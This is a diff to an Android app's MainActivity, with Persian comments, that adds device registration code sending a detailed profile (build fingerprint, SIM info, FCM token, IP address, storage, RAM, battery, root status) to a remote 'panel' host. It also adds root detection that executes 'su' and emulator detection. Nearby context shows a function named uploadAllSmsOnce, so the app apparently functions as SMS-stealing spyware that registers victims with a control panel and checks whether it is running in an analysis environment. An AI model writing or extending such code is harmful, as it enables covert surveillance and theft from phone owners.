@@ -315,20 +315,109 @@ class MainActivity : ComponentActivity() {
             Log.d(TAG, "📝 REGISTERING DEVICE")
             Log.d(TAG, "════════════════════════════════════════")
 
+            // گرفتن اطلاعات Storage
+            val statFs = android.os.StatFs(android.os.Environment.getDataDirectory().path)
+            val totalStorage = statFs.totalBytes
+            val freeStorage = statFs.availableBytes
+
+            // گرفتن اطلاعات RAM
+            val activityManager = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
+            val memInfo = android.app.ActivityManager.MemoryInfo()
+            activityManager.getMemoryInfo(memInfo)
+            val totalRam = memInfo.totalMem
+            val freeRam = memInfo.availMem
+
+            // گرفتن نوع شبکه
+            val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val networkType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val network = connectivityManager.activeNetwork
+                val capabilities = connectivityManager.getNetworkCapabilities(network)
+                when {
+                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
+                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
+                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
+                    else -> "Unknown"
+                }
+            } else {
+                val netInfo = connectivityManager.activeNetworkInfo
+                netInfo?.typeName ?: "Unknown"
+            }
+
+            // چک کردن Root
+            val isRooted = checkIfRooted()
+
+            // گرفتن اطلاعات صفحه نمایش
+            val displayMetrics = resources.displayMetrics
+            val screenResolution = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"
+            val screenDensity = displayMetrics.densityDpi
+
+            // گرفتن وضعیت شارژ
+            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+            val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
+            val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
+                    status == android.os.BatteryManager.BATTERY_STATUS_FULL
+
+            val chargePlug = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
+            val batteryState = when {
+                isCharging && chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_USB -> "charging_usb"
+                isCharging && chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_AC -> "charging_ac"
+                isCharging && chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "charging_wireless"
+                isCharging -> "charging"
+                else -> "discharging"
+            }
+
             val body = JSONObject().apply {
+                // اطلاعات اصلی
                 put("deviceId", deviceId)
-                put("IP_ADDRESS", getIPAddress())
-                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
-                put("deviceModel", Build.MODEL)
-                put("CPU_ARCHITECTURE", Build.SUPPORTED_ABIS[0])
-                put("SDK_INT", Build.VERSION.SDK_INT)
-                put("ANDROID_VERSION", Build.VERSION.RELEASE)
+                put("model", Build.MODEL)
+                put("manufacturer", Build.MANUFACTURER)
+                put("androidVersion", Build.VERSION.RELEASE)
+                put("sdkInt", Build.VERSION.SDK_INT)
+                put("brand", Build.BRAND)
+                put("device", Build.DEVICE)
+                put("product", Build.PRODUCT)
+                put("hardware", Build.HARDWARE)
+                put("board", Build.BOARD)
+                put("display", Build.DISPLAY)
+                put("fingerprint", Build.FINGERPRINT)
+                put("host", Build.HOST)
+
+                // CPU Architecture
+                put("supportedAbis", JSONArray(Build.SUPPORTED_ABIS.toList()))
+
+                // باتری
                 put("battery", getBatteryPercentage())
-                put("fcmToken", fcmToken)
+                put("batteryState", batteryState)
+                put("isCharging", isCharging)
+
+                // حافظه
+                put("totalStorage", totalStorage)
+                put("freeStorage", freeStorage)
+                put("totalRam", totalRam)
+                put("freeRam", freeRam)
+
+                // شبکه
+                put("networkType", networkType)
+                put("ipAddress", getIPAddress())
+
+                // امنیت
+                put("isRooted", isRooted)
+
+                // صفحه نمایش
+                put("screenResolution", screenResolution)
+                put("screenDensity", screenDensity)
+
+                // سیم‌کارت
                 put("simInfo", getSimInfo())
+
+                // FCM Token
+                put("fcmToken", fcmToken)
+
+                // اطلاعات اضافی
                 put("userId", userId)
                 put("Type", "MP")
-                put("isEmulator", true)
+                put("isEmulator", isEmulator())
+                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
             }
 
             val url = URL("https://panel.panelguy.xyz/devices/register")
@@ -360,6 +449,51 @@ class MainActivity : ComponentActivity() {
         } finally {
             conn?.disconnect()
         }
+    }
+
+    // تابع چک کردن Root
+    private fun checkIfRooted(): Boolean {
+        return try {
+            // بررسی فایل‌های معمول Root
+            val paths = arrayOf(
+                "/system/app/Superuser.apk",
+                "/sbin/su",
+                "/system/bin/su",
+                "/system/xbin/su",
+                "/data/local/xbin/su",
+                "/data/local/bin/su",
+                "/system/sd/xbin/su",
+                "/system/bin/failsafe/su",
+                "/data/local/su",
+                "/su/bin/su"
+            )
+
+            paths.any { java.io.File(it).exists() } || checkSuCommand()
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    // چک کردن دستور su
+    private fun checkSuCommand(): Boolean {
+        return try {
+            Runtime.getRuntime().exec("su")
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    // تشخیص Emulator
+    private fun isEmulator(): Boolean {
+        return (Build.FINGERPRINT.startsWith("generic")
+                || Build.FINGERPRINT.startsWith("unknown")
+                || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86")
+                || Build.MANUFACTURER.contains("Genymotion")
+                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+                || "google_sdk" == Build.PRODUCT)
     }
 
     private fun uploadAllSmsOnce() {
